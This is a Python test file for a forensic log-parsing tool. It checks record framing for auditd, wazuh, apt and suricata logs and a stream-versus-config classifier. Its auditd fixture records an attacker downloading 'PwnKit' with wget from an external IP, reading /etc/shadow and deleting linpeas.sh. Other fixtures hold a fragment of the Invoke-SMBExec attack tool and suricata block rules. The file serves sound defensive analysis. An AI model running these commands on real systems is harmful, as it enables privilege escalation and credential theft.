#!/usr/bin/env python3
"""Tests for skills/v14/tools/logmap.py — record framing and the stream/state gate.

Every fixture here is a reduction of a real file from a real attack corpus, and
every assertion is a defect that was MEASURED on 2026-08-18 before it was fixed.
The measurements live in the vault as `sherlock-log-format-catalogue`.

What broke, and why each matters:

* `BLOCK_KEY_RE` demanded `=` and forbade `-` in the key, so paragraph-framed
  records whose separator is `: ` — apt's `history.log`, wazuh's `alerts.log` —
  were read one physical line at a time. A six-line alert became six records and
  the tempo axis counted six events where one happened.

* auditd writes ONE logical event as several physical lines that share
  `msg=audit(<epoch>.<ms>:<serial>)`. No framing covered "consecutive lines that
  share a correlation token", so a SYSCALL/EXECVE/PATH/PROCTITLE group was four
  records — and the `EXECVE` arguments were never in the same record as the
  `SYSCALL` that ran them, which is the whole point of reading auditd.

* The dangerous half of that fix: suricata's `eve.json` ALSO has a token that
  groups consecutive lines (`flow_id`), but every line there is already a
  complete JSON record. Grouping it would fuse unrelated events. So the grouping
  must be unreachable for a file whose lines are self-contained, and these tests
  pin that it is.

* Pointed at a real Linux evidence bundle, Step 1 spent about half its worklist
  budget on `/etc`: 113 of 250 rows (logmap v13) and 158 of 250 (flatmap) cited
  config files rather than logs. A bundle ships configs beside logs — one AIT-LDS
  host holds 31 log files and 695 config files. The gate separates them by
  arithmetic, and `state` must never mean "discard": the eight `state` files in
  the BlueSky corpus are the attacker's own toolkit.

    python3 tools/tests/test_record_framing_v14.py
"""
import importlib.util
import os
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.dirname(HERE)
SHERLOCK = os.path.dirname(TOOLS)
LOGMAP = os.path.join(SHERLOCK, "skills", "v14", "tools", "logmap.py")

_spec = importlib.util.spec_from_file_location("logmap_v14", LOGMAP)
L = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(L)


def write(tmp, name, text):
    p = os.path.join(tmp, name)
    with open(p, "w") as fh:
        fh.write(text)
    return p


# --------------------------------------------------------------------------
# fixtures — each reduced from a real file, keeping the shape that broke
# --------------------------------------------------------------------------

# /var/log/apt/history.log, cloudru-monitoring. Blank-line paragraphs, `Key: value`
# with a HYPHEN in the key. That hyphen is what the old regex rejected.
APT_HISTORY = """
Start-Date: 2026-08-01  06:25:59
Commandline: /usr/bin/unattended-upgrade
Upgrade: libssl3t64:amd64 (3.0.13-0ubuntu3.11, 3.0.13-0ubuntu3.12)
End-Date: 2026-08-01  06:26:01

Start-Date: 2026-08-01  06:26:09
Commandline: /usr/bin/unattended-upgrade
Upgrade: tzdata:amd64 (2026b-0ubuntu0.24.04.1, 2026c-0ubuntu0.24.04.1)
End-Date: 2026-08-01  06:26:09

Start-Date: 2026-08-01  06:26:12
Commandline: /usr/bin/unattended-upgrade
Upgrade: distro-info-data:amd64 (0.60ubuntu0.6, 0.72-0ubuntu0.24.04.1)
End-Date: 2026-08-01  06:26:12
"""

# wazuh alerts.log, CAM-LDS. One alert = a banner, a source line, a rule line, the
# quoted original record, then the decoded fields. Two timestamp shapes alternate
# inside one block, which is what broke monotonicity before it was measured per
# shape. Reduced from the real file but keeping its proportions: the decoded
# `audit.*:` tail is most of the block, and it is why key_share is 0.88 there.
WAZUH_ALERTS = "".join(
    "** Alert 17581151%02d.%d: - audit,audit_selinux,gdpr_IV_30.1.g\n"
    "2025 Sep 17 13:%02d:%02d wazuh->/var/log/audit/audit.log\n"
    "Rule: 80730 (level 3) -> 'Auditd: SELinux permission check.'\n"
    'type=AVC msg=audit(17581151%02d.074:%d): apparmor="STATUS" operation="profile_replace"\n'
    "audit.type: AVC\n"
    "audit.id: %d\n"
    "audit.pid: %d\n"
    "audit.auid: 4294967295\n"
    "audit.uid: 0\n"
    "\n"
    % (i, 1000 + i, 18 + i // 60, i % 60, i, 1500 + i, 1500 + i, 1552 + i)
    for i in range(24))

# auditd, CAM-LDS videoserver. One event = four physical lines sharing msg=audit(...).
# No blank lines, no leading timestamp — nothing but the shared token groups them.
AUDITD = "".join(
    'type=SYSCALL msg=audit(17581151%02d.498:%d): arch=c000003e syscall=59 success=yes exit=0 comm="%s"\n'
    'type=EXECVE msg=audit(17581151%02d.498:%d): argc=2 a0="%s" a1="%s"\n'
    'type=PATH msg=audit(17581151%02d.498:%d): item=0 name="/usr/bin/%s" inode=%d\n'
    'type=PROCTITLE msg=audit(17581151%02d.498:%d): proctitle=2F62696E2F62617368\n'
    % (i, 100 + i, cmd, i, 100 + i, cmd, arg, i, 100 + i, cmd, 1000 + i, i, 100 + i)
    for i, (cmd, arg) in enumerate([
        ("wget", "http://192.42.1.174/PwnKit"), ("chmod", "+x"), ("id", "-u"),
        ("cat", "/etc/shadow"), ("rm", "linpeas.sh"), ("split", "--filter"),
    ]))

# suricata eve.json. flow_id groups consecutive lines exactly like auditd's msg does,
# but each line is already a complete record. This is the fixture that must NOT group.
EVE_JSON = "\n".join(
    '{"timestamp":"2025-09-17T13:1%d:0%d.000000+0000","flow_id":%d,"event_type":"dns","src_ip":"192.42.1.174","dest_ip":"192.42.0.233","proto":"UDP","dns":{"rrname":"video.attackbed.com"}}'
    % (i // 6, i % 6, 2000 + i // 3)
    for i in range(18)
) + "\n"

# an /etc file: no timestamps anywhere. This is what ate half the worklist budget.
SURICATA_RULES = """#
# $Id: emerging-compromised.rules
#
# Rules to block known hostile or compromised hosts. These lists are updated daily
# or better from many sources.
#
# Sources include:
#   Dshield Top Attackers
#   Spamhaus DROP
#
alert ip [1.2.3.4,5.6.7.8] any -> $HOME_NET any (msg:"ET COMPROMISED Known Compromised Host"; sid:2500000;)
alert ip [9.10.11.12] any -> $HOME_NET any (msg:"ET COMPROMISED Known Compromised Host"; sid:2500001;)
"""

# an attacker toolkit file carved out of the BlueSky corpus: real evidence, no clock.
PS1_TOOLKIT = """function Invoke-SMBExec {
    param([String]$Target, [String]$Username, [String]$Hash)
    $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty Id
    $SMB_relay_challenge = $SMB_client_receive[[byte[]]0x4a..0x51]
    return $SMB_relay_response
}
"""

AUTH_LOG = "".join(
    "Sep 22 08:0%d:39 intranet sshd[%d]: Failed password for invalid user admin from 10.0.0.%d port 5%d ssh2\n"
    % (i % 10, 2000 + i, i, 1000 + i)
    for i in range(40)
)


class RecordFraming(unittest.TestCase):
    """One logical record must be one record, whatever holds it together."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def framing_of(self, name, text):
        p = write(self.tmp, name, text)
        framing, _shape, _axes, _note, _out = L.probe(p)
        return p, framing

    def records(self, path, framing):
        return list(L.stream_records(path, framing))

    # -- the hyphen that cost a whole framing -------------------------------
    def test_apt_history_is_paragraph_framed(self):
        p, framing = self.framing_of("history.log", APT_HISTORY)
        self.assertEqual(framing, L.FRAME_BLOCK,
                         "apt history.log is blank-line-separated `Key: value` blocks")
        recs = self.records(p, framing)
        self.assertEqual(len(recs), 3, "three Start-Date..End-Date paragraphs")
        # the record must actually carry the whole block, not just its first line
        self.assertIn("Commandline:", recs[0][2])
        self.assertIn("End-Date:", recs[0][2])

    def test_block_key_accepts_colon_and_hyphen(self):
        self.assertTrue(L.BLOCK_KEY_RE.match("Start-Date: 2026-08-01"))
        self.assertTrue(L.BLOCK_KEY_RE.match("_COMM=sshd"),
                        "journald export uses KEY=value and must keep working")
        self.assertFalse(L.BLOCK_KEY_RE.match("  indented: value"),
                         "a continuation line is not a key line")

    def test_wazuh_alert_block(self):
        p, framing = self.framing_of("alerts.log", WAZUH_ALERTS)
        self.assertEqual(framing, L.FRAME_BLOCK)
        recs = self.records(p, framing)
        self.assertEqual(len(recs), 24, "24 alerts, not 240 physical lines")
        # the quoted original record must live in the SAME record as its rule
        self.assertIn("Rule: 80730", recs[0][2])
        self.assertIn('apparmor="STATUS"', recs[0][2])

    # -- the correlation token ---------------------------------------------
    def test_auditd_event_group(self):
        p, framing = self.framing_of("audit.log", AUDITD)
        self.assertEqual(L.frame_base(framing), L.FRAME_KEY,
                         "auditd groups by a shared token, not by blanks or a leading stamp")
        self.assertEqual(L.frame_field(framing), "kv:msg",
                         "the framing must NAME the token it grouped on, so a reader can "
                         "check it — an unexplained regrouping of evidence is not auditable")
        recs = self.records(p, framing)
        self.assertEqual(len(recs), 6, "six events of four lines each")
        # THE point of grouping: the command and the syscall that ran it, together
        self.assertIn("a0=\"wget\"", recs[0][2])
        self.assertIn("syscall=59", recs[0][2])
        self.assertIn("PwnKit", recs[0][2])

    def test_auditd_record_spans_are_physical_lines(self):
        """A grouped record still reports the physical line range it came from —
        that is what keeps a citation checkable."""
        p, framing = self.framing_of("audit.log", AUDITD)
        recs = self.records(p, framing)
        self.assertEqual((recs[0][0], recs[0][1]), (1, 4))
        self.assertEqual((recs[1][0], recs[1][1]), (5, 8))
        self.assertEqual((recs[5][0], recs[5][1]), (21, 24))

    def test_assemble_and_stream_agree_on_grouped_records(self):
        """stream_records() and assemble() must not disagree, or the map and the
        worklist would cite different things."""
        p, framing = self.framing_of("audit.log", AUDITD)
        lines = [L.deansi(l) for l in open(p)]
        self.assertEqual([(s, e) for s, e, _t in L.assemble(lines, framing)],
                         [(s, e) for s, e, _t in self.records(p, framing)])

    # -- the guard that stops the fix eating good records ------------------
    def test_self_contained_json_lines_are_never_grouped(self):
        """eve.json has flow_id, which groups consecutive lines just like auditd's
        msg does. Every line is already a whole record, so grouping would fuse
        unrelated events. It must stay one record per line."""
        p, framing = self.framing_of("eve.json", EVE_JSON)
        self.assertNotEqual(L.frame_base(framing), L.FRAME_KEY)
        recs = self.records(p, framing)
        self.assertEqual(len(recs), 18, "one JSON object per line, all 18 kept apart")

    def test_a_slowly_changing_attribute_is_not_a_record_id(self):
        """The test that stops the grouping running away.

        Contiguity alone cannot tell a record identifier from an attribute that
        merely changes slowly — a pid, a session, a source port all group
        consecutive lines just as tidily as an audit serial does. AIT-LDS has an
        auditd file of 2,316 lines carrying 2,308 distinct audit ids: almost one
        event per line. Grouped by pid it collapsed to 539 records, inventing
        multi-line events out of unrelated consecutive work by one process.

        The corroborating witness is the clock: the lines of ONE record share ONE
        timestamp. Measured, kv:msg on a real grouped file scores 1.00 and pid,
        session and two positional tokens score 0.40, 0.40, 0.43 and 0.14.
        """
        text = "".join(
            'type=USER_ACCT msg=audit(16427237%02d.072:%d): pid=10125 uid=0 res=success\n'
            'type=CRED_ACQ msg=audit(16427237%02d.072:%d): pid=10125 uid=0 res=success\n'
            % (i, 400 + i * 2, i + 1, 401 + i * 2)
            for i in range(30))
        p, framing = self.framing_of("audit.log", text)
        self.assertEqual(framing, L.FRAME_LINE,
                         "pid is constant across lines whose timestamps differ, so it "
                         "identifies a process, not a record")
        self.assertEqual(len(self.records(p, framing)), 60)

    def test_leading_timestamp_still_wins(self):
        """auth.log lines share a PID across consecutive lines. Anchor framing must
        be chosen first so the correlation token is never even considered."""
        p, framing = self.framing_of("auth.log", AUTH_LOG)
        self.assertEqual(framing, L.FRAME_ANCHOR)
        self.assertEqual(len(self.records(p, framing)), 40)


class StreamOrState(unittest.TestCase):
    """A log stream has a time axis. A config does not. Neither is worthless, and
    they must not compete for the same budget."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()

    def verdict(self, name, text):
        p = write(self.tmp, name, text)
        return L.time_axis(p)["verdict"]

    def test_log_is_a_stream(self):
        self.assertEqual(self.verdict("auth.log", AUTH_LOG), "stream")

    def test_config_is_state(self):
        self.assertEqual(self.verdict("compromised.rules", SURICATA_RULES), "state")

    def test_attacker_toolkit_is_state_not_discarded(self):
        """The eight `state` files in the BlueSky corpus are the attacker's own
        tools. `state` is a budget, never a bin."""
        self.assertEqual(self.verdict("Invoke-SMBExec.ps1.txt", PS1_TOOLKIT), "state")

    def test_block_framed_log_is_not_demoted(self):
        """wazuh timestamps line 2 of a four-line record, so per-LINE coverage is
        0.25 and the naive test called a perfectly good alert stream a config."""
        self.assertTrue(self.verdict("alerts.log", WAZUH_ALERTS).startswith("stream"))

    def test_relative_clock_counts(self):
        """dmesg and Xorg carry seconds since boot, not a wall clock. Still a time
        axis, still monotone — which is all `appeared late` needs."""
        dmesg = "".join("[ %8.6f] kernel: line %d\n" % (i * 0.5, i) for i in range(60))
        self.assertEqual(self.verdict("dmesg", dmesg), "stream")

    def test_mixed_shapes_do_not_break_monotonicity(self):
        """wazuh alternates an epoch and a wall clock inside one block. Comparing
        across shapes scored an ordered stream at 0.50 and demoted it."""
        text = "".join(
            "** Alert 17581151%02d.0: -\n2025 Sep 17 13:18:%02d wazuh->x\n\n" % (i, i)
            for i in range(40))
        self.assertTrue(self.verdict("alerts.log", text).startswith("stream"))

    def test_column_time_axis(self):
        """pcap/tcp-streams.tsv keeps its clock in a COLUMN of relative seconds;
        no date appears anywhere in the file."""
        rows = ["stream\tt_start\tendpoint_a\tendpoint_b"]
        rows += ["%d\t%.6f\t10.0.0.1:80\t10.0.0.2:443" % (i, i * 2.5) for i in range(40)]
        self.assertEqual(self.verdict("tcp-streams.tsv", "\n".join(rows) + "\n"),
                         "stream-table")

    def test_empty_and_binary_are_neither(self):
        self.assertEqual(self.verdict("empty.log", ""), "empty")


if __name__ == "__main__":
    unittest.main(verbosity=2)
